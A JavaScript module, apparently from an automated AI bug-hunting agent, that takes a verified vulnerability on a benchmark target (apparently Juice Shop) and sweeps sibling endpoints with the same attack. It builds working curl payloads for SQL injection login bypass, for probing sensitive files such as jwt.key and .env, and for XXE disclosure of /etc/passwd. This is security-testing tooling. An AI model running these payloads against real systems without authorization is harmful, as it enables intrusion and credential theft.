// Dark Matter hunt-intel — VARIANT SWEEP (19 Oct 2026, elite-gap cycle).
//
// The elite move after confirming a vulnerability: sweep SIBLING input
// vectors for the SAME vuln class. An elite human who finds SQLi on /login
// immediately fires the same payload family at search, basket, feedback and
// every other parameterized endpoint — they do not spend the session
// re-proving the one bug they already own.
//
// Live evidence for the gap: 50 of 52 verified:true events on the benchmark
// hunt are the SAME "SQLi authentication bypass on login" finding
// re-verified; the agent had no mechanism that varies the attack surface
// after a confirmation. (The XBOW playbook's variant-analysis item,
// user-ordered 18:32 IST, is what this implements.)
//
// Design (mirrors the proven deterministic-probe pattern, solvers #124-126):
// - recon-grounded: siblings come from recon.endpoints, never invented
// - one probe per planning iteration, front of the execution window
// - once per hunt per sibling (persisted deterministicProbesRun flag)
// - premise-versioned detIds (solver #126 rule: new premise -> new detId,
//   so a corrected sweep re-fires; bump VARIANT_SWEEP_VERSION to re-sweep)
// - commands fit the driver's 500-char execution cap (solver #126 lesson)
// - file-exposure probes label observations in the pipeline's signal
//   vocabulary ("EXPOSED: … WITHOUT authentication") — solver #126 lesson
// - safe read-only probes only; the untouched assessResult pipeline decides
//   what counts as a finding. Validators are NOT loosened.

export const VARIANT_SWEEP_VERSION = 1;

// How many sibling vectors to sweep per class (one fires per iteration,
// so this bounds the sweep to ~N iterations of front-window usage).
export const MAX_SWEEP_SIBLINGS = 4;

/**
 * Map a verified finding's title to a sweepable vuln class.
 * Handles the "PoC confirmed: <title>" re-verification titles too.
 * Returns 'sqli' | 'file-exposure' | 'xxe' | null (null = no sweep defined yet).
 */
export function classifyFinding(title) {
  const t = String(title || '').replace(/^PoC confirmed:\s*/i, '');
  if (/sqli|sql\s*injection/i.test(t)) return 'sqli';
  if (/ftp|directory listing|sensitive file|kdbx/i.test(t)) return 'file-exposure';
  // XXE (19 Oct 2026, solver #131): third verified class — "XXE
  // external-entity file disclosure on /file-upload". Pattern matches the
  // verified title and PoC re-titles; no overlap with the sqli/file-exposure
  // patterns above ("external entity" contains neither "sql" nor "ftp").
  if (/xxe|external.?entity/i.test(t)) return 'xxe';
  return null;
}

/**
 * Rank sibling endpoints for a sweep from recon-discovered endpoints.
 * Excludes the already-verified vector (login for sqli — the mandatory auth
 * net re-tests it every iteration anyway; /ftp/ for file-exposure — the
 * kdbx deterministic probe covers it).
 */
export function sweepSiblings(cls, reconEndpoints) {
  // Normalize: strip query strings/fragments so "/search?q=1" and "/search"
  // are the same sibling (avoids building "?q=1?q=<payload>" URLs).
  const eps = (reconEndpoints || [])
    .map((e) => String(e).trim().split(/[?#]/)[0])
    .filter(Boolean);
  const seen = new Set();
  const out = [];
  const push = (e) => {
    const k = e.toLowerCase();
    if (seen.has(k) || out.length >= MAX_SWEEP_SIBLINGS) return;
    seen.add(k);
    out.push(e);
  };
  if (cls === 'sqli') {
    // Search-style endpoints first (query-param injection is the classic
    // sibling), then other REST/API endpoints. Never the login vector.
    for (const e of eps) {
      if (/login|signin/i.test(e)) continue;
      if (/search/i.test(e)) push(e);
    }
    for (const e of eps) {
      if (/login|signin|search/i.test(e)) continue;
      if (/^\/(api|rest)/i.test(e)) push(e);
    }
  } else if (cls === 'file-exposure') {
    // Sibling static directories only — never /ftp/ itself.
    for (const e of eps) {
      if (/^\/ftp\/?$/i.test(e)) continue;
      if (/\/$/.test(e) || /\/(assets|static|files|encryptionkeys|video|promotion|download|public)/i.test(e)) push(e);
    }
  } else if (cls === 'xxe') {
    // XXE siblings (solver #131): endpoints that might parse XML — upload /
    // import / SOAP / WSDL / feed style first. Never the verified vector
    // (/file-upload — the deterministic probe owns it and the verified-pair
    // ledger re-tests it). Fallback: other REST/API endpoints get a raw-XML
    // body probe — an elite hunter fires the proven payload family at every
    // sibling parser, and the untouched assessResult pipeline discards the
    // negatives silently.
    for (const e of eps) {
      if (/file-?upload/i.test(e)) continue;
      if (/upload|import|soap|wsdl|\bxml\b|feed|rss|docx|xlsx|svg/i.test(e)) push(e);
    }
    for (const e of eps) {
      if (/file-?upload|upload|import|soap|wsdl|\bxml\b|feed|rss|docx|xlsx|svg/i.test(e)) continue;
      if (/^\/(api|rest)/i.test(e)) push(e);
    }
  }
  return out;
}

function slug(ep) {
  return (
    String(ep)
      .replace(/[^a-z0-9]+/gi, '-')
      .replace(/^-+|-+$/g, '')
      .toLowerCase()
      .slice(0, 40) || 'root'
  );
}

/**
 * Build one deterministic sweep probe. Returns null when the sibling was
 * already swept this hunt (detRun holds the spent detId).
 * Every command is safe read-only and MUST stay under the driver's
 * 500-char execution cap.
 */
export function buildSweepProbe(cls, endpoint, baseUrl, detRun) {
  const detId = `variant-sweep-${cls}-v${VARIANT_SWEEP_VERSION}-${slug(endpoint)}`;
  if (detRun && detRun.has(detId)) return null;
  const base = String(baseUrl || '').replace(/\/$/, '');

  if (cls === 'sqli') {
    const isSearch = /search/i.test(endpoint);
    // Same payload family that verified on the login vector — the elite
    // sweep fires what worked, at the new vector. Search-style endpoints
    // take query params; others get the proven JSON login-shaped body.
    const command = isSearch
      ? `curl -sk "${base}${endpoint}?q=%27%20OR%201%3D1--" | head -c 2000`
      : `curl -sk -X POST "${base}${endpoint}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`;
    return {
      detId,
      test: `SQLi variant sweep on ${endpoint}`,
      command,
      why: `SQLi is verified on the login vector — an elite hunter now fires the same payload family at every sibling input vector; ${endpoint} takes input and was never tested for SQLi`,
      hypothesis: 'The SQL injection flaw may not be isolated to /login — sibling endpoints may share the vulnerable query pattern',
    };
  }

  if (cls === 'file-exposure') {
    const dir = endpoint.endsWith('/') ? endpoint : `${endpoint}/`;
    // Compact filename loop (fits the 500-char cap — solver #126 lesson).
    // Labels observations in the pipeline's signal vocabulary so the
    // triage stage can see a genuine exposure (solver #126 lesson):
    // "EXPOSED: <file> WITHOUT authentication (HTTP 200, Nb)" is only
    // printed when code==200 && bytes>0.
    const command = `{ for f in jwt.key .env config.json; do r=$(curl -sk -o /dev/null -w "%{http_code} %{size_download}" "${base}${dir}$f"); [ "\${r%% *}" = 200 ] && [ "\${r##* }" -gt 0 ] && echo "EXPOSED: ${dir}$f WITHOUT authentication (HTTP \${r%% *}, \${r##* }b)" || echo "not exposed: ${dir}$f"; done; }`;
    return {
      detId,
      test: `Sensitive-file variant sweep on ${dir}`,
      command,
      why: `Unauthenticated sensitive-file exposure is verified under /ftp/ — an elite hunter now checks every sibling static directory for the same flaw`,
      hypothesis: 'Sibling static directories may expose sensitive files without authentication, the way /ftp/ did',
    };
  }

  if (cls === 'xxe') {
    // Same payload family that verified on /file-upload (v2 deterministic
    // probe, solver #130): error-based external-entity file disclosure.
    // Upload-ish endpoints get the multipart shape; everything else gets a
    // raw XML body. The success label speaks the pipeline's signal
    // vocabulary ("VULNERABLE"/"EXPOSED" — the v1 silent-discard lesson)
    // and carries the genuinely observed "root:x:0:0" fragment, printed
    // ONLY when grep -q 'root:' passes on the real response — so
    // extractSignal yields 'cmd-exec' and the re-run confirmation compares
    // equal. Safe read-only; must stay under the 500-char driver cap.
    const payload = '<!DOCTYPE r [<!ENTITY c SYSTEM "file:///etc/passwd">]><r>&c;</r>';
    const send = /upload|import|file/i.test(endpoint)
      ? `curl -sk -X POST -F "file=@/tmp/xxesw.xml" "${base}${endpoint}"`
      : `curl -sk -X POST "${base}${endpoint}" -H "Content-Type: application/xml" --data-binary @/tmp/xxesw.xml`;
    const command = `printf '%s' '${payload}' >/tmp/xxesw.xml; R=$(${send}); echo "$R"|grep -q 'root:' && echo 'XXE VULNERABLE: external entity resolved on ${endpoint} - /etc/passwd EXPOSED WITHOUT authentication (root:x:0:0)' || echo 'not vulnerable: entity not resolved'; rm -f /tmp/xxesw.xml`;
    return {
      detId,
      test: `XXE variant sweep on ${endpoint}`,
      command,
      why: `XXE file disclosure is verified on /file-upload — an elite hunter now fires the same external-entity payload family at every sibling XML parser; ${endpoint} was never tested for XXE`,
      hypothesis: 'Sibling endpoints may resolve XML external entities the way /file-upload did',
    };
  }

  return null;
}

/**
 * One-time backfill: which sweepable classes are already verified on this
 * hunt (from finding events). Lets the sweep fire for findings verified
 * before this module shipped, without re-scanning events every iteration.
 */
export function backfillVerifiedClasses(events) {
  const classes = [];
  for (const e of events || []) {
    if (e && e.type === 'finding' && e.verified === true) {
      const cls = classifyFinding(e.title);
      if (cls && !classes.includes(cls)) classes.push(cls);
    }
  }
  return classes;
}
